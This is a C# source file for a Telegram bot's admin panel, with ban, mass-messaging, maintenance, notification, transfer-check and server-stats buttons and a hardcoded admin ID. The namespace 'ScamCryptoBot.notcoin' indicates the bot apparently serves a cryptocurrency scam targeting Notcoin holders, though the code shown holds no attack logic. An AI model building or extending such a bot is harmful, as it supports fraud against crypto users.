using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
namespace ScamCryptoBot.notcoin
{
    internal class AdminPanel
    {
        public static int adminID = 349421147;
        public static bool adminFlagWait = false;
        public static bool adminFlagTO = false;
        public static bool adminFlagNotificator = false;

        public static InlineKeyboardMarkup RenderAdminPanel()
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
               new List<InlineKeyboardButton[]>()
               {
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️ Ban User","adm_ban_user"),
                        InlineKeyboardButton.WithCallbackData("⚙️ Emaling","adm_emailing"),

                    },
                    new InlineKeyboardButton[]
                    {
                         InlineKeyboardButton.WithCallbackData("⚙️ TO","adm_to"),
                         InlineKeyboardButton.WithCallbackData("⚙️ Notificator","adm_notif")
                    },
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️ Check NOT","adm_check_transfer"),
                        InlineKeyboardButton.WithCallbackData("⚙️ Server Stats","adm_server_stats")
                    }
               }
               );
            return inlineKeyboard;
        }

        public static async Task SendAdminNotif(ITelegramBotClient botClient, string message)

        {
            if (adminFlagNotificator)
            {
                await botClient.SendTextMessageAsync(adminID, message, parseMode: ParseMode.Html);
            }
        }



    }
}
